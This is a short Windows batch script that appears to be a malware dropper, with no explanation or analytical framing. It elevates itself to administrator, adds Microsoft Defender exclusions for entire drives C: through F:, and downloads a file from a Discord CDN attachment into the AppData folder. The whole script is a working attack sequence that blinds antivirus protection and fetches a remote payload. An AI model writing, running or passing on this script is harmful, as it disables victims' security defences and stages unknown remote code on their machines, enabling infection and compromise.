@echo off
cls

if not "%1"=="am_admin" (
    powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'"
    exit /b
)

powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "D:"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "E:"
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "F:"
powershell -Command "Invoke-WebRequest https://cdn.discordapp.com/attachments/1079085125851152394/1079085193727594556/1.txt.txt -OutFile %AppData%\test.txt"
pause
